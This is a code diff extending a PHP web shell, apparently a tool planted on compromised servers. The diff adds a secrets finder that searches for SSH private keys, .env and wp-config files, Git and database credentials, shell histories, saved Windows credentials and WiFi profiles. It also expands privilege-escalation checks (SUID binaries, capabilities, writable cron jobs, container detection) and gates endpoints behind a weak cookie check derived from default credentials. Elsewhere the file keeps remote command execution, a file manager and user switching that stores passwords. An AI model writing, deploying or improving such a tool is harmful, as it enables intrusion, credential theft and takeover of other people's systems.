@@ -50,8 +50,15 @@ function esila_exec($cmd) {
     return ($out !== null && $out !== false) ? $out : '';
 }
 
+// Auth helper for pre-login endpoints
+function esila_auth_ok() {
+    return (isset($_SESSION['logged_in']) && $_SESSION['logged_in'])
+        || (isset($_COOKIE['esila_auth']) && $_COOKIE['esila_auth'] === md5(DEFAULT_USER . ':' . DEFAULT_PASS));
+}
+
 // .htaccess fix endpoint
 if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
+    if (!esila_auth_ok()) { http_response_code(403); exit; }
     header('Content-Type: application/json');
     $dir = dirname(__FILE__);
     $mode = isset($_POST['mode']) ? $_POST['mode'] : 'module';
@@ -67,6 +74,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
 
 // Self-destruct
 if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
+    if (!esila_auth_ok()) { http_response_code(403); exit; }
     header('Content-Type: application/json');
     $minutes = intval(isset($_POST['minutes']) ? $_POST['minutes'] : 0);
     if ($minutes > 0 && $minutes <= 1440) {
@@ -299,7 +307,18 @@ if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
         }
     }
     $test = trim($test);
-    if (strpos($test, $su_user) !== false || strpos($test, strtolower($su_user)) !== false) {
+    $test_lines = explode("\n", $test);
+    $test_last = strtolower(trim(end($test_lines)));
+    $su_check = strtolower($su_user);
+    if (strpos($su_check, '\\') !== false) $su_check = substr($su_check, strrpos($su_check, '\\') + 1);
+    $matched = false;
+    foreach ($test_lines as $tl) {
+        $tl = strtolower(trim($tl));
+        if ($tl === $su_check || (strpos($tl, '\\') !== false && substr($tl, strrpos($tl, '\\') + 1) === $su_check)) {
+            $matched = true; break;
+        }
+    }
+    if ($matched) {
         $_SESSION['su_user'] = $su_user;
         $_SESSION['su_pass'] = $su_pass;
         echo json_encode(array('ok' => true, 'msg' => 'Switched to ' . $su_user, 'user' => $su_user));
@@ -453,7 +472,8 @@ if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
             if ($sz !== false && $sz > 2097152) {
                 echo json_encode(array('content' => '[File too large to edit: ' . round($sz/1048576, 1) . ' MB. Use download instead.]'));
             } else {
-                echo json_encode(array('content' => @file_get_contents($path)));
+                $fc = @file_get_contents($path);
+                echo json_encode(array('content' => ($fc !== false ? $fc : '[Cannot read file: permission denied or file not found]')));
             }
             break;
         case 'write':
@@ -523,8 +543,32 @@ if (isset($_POST['action']) && $_POST['action'] === 'find_suid') {
         $out .= "\n\n=== Scheduled Tasks (writable) ===\n" . trim(esila_exec('schtasks /query /fo LIST /V 2>nul | findstr /I "Task To Run"'));
         echo json_encode(array('result' => $out ?: 'No privilege escalation vectors found.'));
     } else {
-        echo json_encode(array('result' => trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))));
+        $out = "=== SUID Binaries ===\n" . trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'));
+        $caps = trim(esila_exec('getcap -r / 2>/dev/null | head -30'));
+        if ($caps) $out .= "\n\n=== Capabilities ===\n" . $caps;
+        $out .= "\n\n=== Writable Cron ===\n" . trim(esila_exec('find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null'));
+        $docker = '';
+        if (file_exists('/.dockerenv')) $docker = 'Running inside Docker container';
+        elseif (@is_readable('/proc/1/cgroup') && strpos(@file_get_contents('/proc/1/cgroup'), 'docker') !== false) $docker = 'Running inside Docker container';
+        if ($docker) $out .= "\n\n=== Container ===\n" . $docker;
+        echo json_encode(array('result' => $out));
     }
+    exit;
+}
+
+// SSH keys & interesting files finder
+if (isset($_POST['action']) && $_POST['action'] === 'find_secrets') {
+    header('Content-Type: application/json');
+    if (IS_WIN) {
+        $out = "=== Saved Credentials ===\n" . trim(esila_exec('cmdkey /list 2>nul'));
+        $out .= "\n\n=== WiFi Passwords ===\n" . trim(esila_exec('netsh wlan show profiles 2>nul'));
+        $out .= "\n\n=== Interesting Files ===\n" . trim(esila_exec('dir /s /b C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.xml C:\\Users\\*.config 2>nul | findstr /I "pass cred secret token" | head -20 2>nul'));
+    } else {
+        $out = "=== SSH Keys ===\n" . trim(esila_exec('find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null | head -20'));
+        $out .= "\n\n=== Interesting Files ===\n" . trim(esila_exec('find / -name ".bash_history" -o -name ".mysql_history" -o -name "wp-config.php" -o -name ".env" -o -name ".git-credentials" -o -name ".netrc" -o -name ".pgpass" 2>/dev/null | head -20'));
+        $out .= "\n\n=== Listening Ports ===\n" . trim(esila_exec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'));
+    }
+    echo json_encode(array('result' => $out));
     exit;
 }
 
@@ -566,12 +610,16 @@ if (isset($_POST['action']) && $_POST['action'] === 'nettool') {
             break;
         case 'dns':
             $out = esila_exec(IS_WIN ? "nslookup $t 2>&1" : "nslookup $t 2>&1 || dig $t 2>&1 || host $t 2>&1");
+            if (empty(trim($out))) {
+                $ip = @gethostbyname($target);
+                $out = ($ip !== $target) ? "$target -> $ip (PHP gethostbyname)" : "Could not resolve. Install dnsutils for full DNS lookups.";
+            }
             break;
         case 'arp':
             $out = esila_exec("arp -a 2>&1");
             break;
         case 'curl':
-            $out = esila_exec(IS_WIN ? "curl -sI $t 2>&1 || powershell -c \"try{(Invoke-WebRequest -Uri $t -Method Head -UseBasicParsing).Headers|Format-List}catch{\\$_.Exception.Message}\" 2>&1" : "curl -sI $t 2>&1");
+            $out = esila_exec(IS_WIN ? "curl -sI --connect-timeout 5 --max-time 10 $t 2>&1 || powershell -c \"try{(Invoke-WebRequest -Uri $t -Method Head -UseBasicParsing -TimeoutSec 10).Headers|Format-List}catch{\\$_.Exception.Message}\" 2>&1" : "curl -sI --connect-timeout 5 --max-time 10 $t 2>&1");
             break;
     }
     echo json_encode(array('result' => $out));
